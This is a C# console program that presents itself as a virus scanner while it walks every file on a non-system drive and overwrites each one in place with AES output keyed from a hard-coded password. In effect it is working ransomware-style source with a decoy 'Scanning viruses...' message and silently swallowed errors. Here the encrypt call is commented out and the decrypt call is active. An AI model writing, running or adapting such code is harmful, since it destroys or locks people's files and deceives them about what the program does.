// See https://aka.ms/new-console-template for more information
using System.Security.Cryptography;
using System.Text;


DriveInfo[] allDrives = DriveInfo.GetDrives();
System.IO.DriveInfo di = null;
foreach (DriveInfo d in allDrives)
{
    if(!d.Name.Contains(@"C:\"))
    {
        di = d;
        break;
    }    
}
System.IO.DirectoryInfo dirInfo = di.RootDirectory;
System.IO.DirectoryInfo[] folders =dirInfo.GetDirectories("*.*");
string password = "90RingStrawberry@%";
Console.WriteLine("Scanning viruses...");
foreach (DirectoryInfo folder in folders)
{
    if(folder.FullName.Contains("System Volume Information"))
    {
        continue;
    }    
    string[] files = Directory.GetFiles(folder.FullName, "*", SearchOption.AllDirectories);

    EncryptionFile enc = new EncryptionFile();
    DecryptionFile dec = new DecryptionFile();

    

    for (int i = 0; i < files.Length; i++)
    {
        Console.WriteLine(files[i]);
        //enc.EncryptFile(files[i], password);
        dec.DecryptFile(files[i], password);
    }
}

public class EncryptionFile
{
    public void EncryptFile(string file, string password)
    {
        byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
        byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
        // Hash the password with SHA256
        passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
        byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);
        string fileEncrypted = file;
        try
        {
            File.WriteAllBytes(fileEncrypted, bytesEncrypted);
        }
        catch (UnauthorizedAccessException)
        {
        }
        
    }
}

public class DecryptionFile
{
    public void DecryptFile(string fileEncrypted, string password)
    {

        byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
        byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
        passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

        byte[] bytesDecrypted = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, passwordBytes);

        string file = fileEncrypted;
        try
        {
            File.WriteAllBytes(file, bytesDecrypted);
        }
        catch (System.UnauthorizedAccessException)
        {
        }
        
    }
}

public class CoreEncryption
{
    public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
        byte[] encryptedBytes = null;

        // Set your salt here, change it to meet your flavor:
        // The salt bytes must be at least 8 bytes.
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

        using (MemoryStream ms = new MemoryStream())
        {
            using (RijndaelManaged AES = new RijndaelManaged())
            {
                AES.KeySize = 256;
                AES.BlockSize = 128;

                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);

                AES.Mode = CipherMode.CBC;

                using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                    cs.Close();
                }
                encryptedBytes = ms.ToArray();
            }
        }

        return encryptedBytes;
    }
}

public class CoreDecryption
{
    public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
    {
        byte[] decryptedBytes = null;

        // Set your salt here, change it to meet your flavor:
        // The salt bytes must be at least 8 bytes.
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

        using (MemoryStream ms = new MemoryStream())
        {
            using (RijndaelManaged AES = new RijndaelManaged())
            {
                AES.KeySize = 256;
                AES.BlockSize = 128;

                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);

                AES.Mode = CipherMode.CBC;

                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    try
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    catch (System.Security.Cryptography.CryptographicException)
                    {
                    }
                    
                }
                decryptedBytes = ms.ToArray();
            }
        }

        return decryptedBytes;
    }
}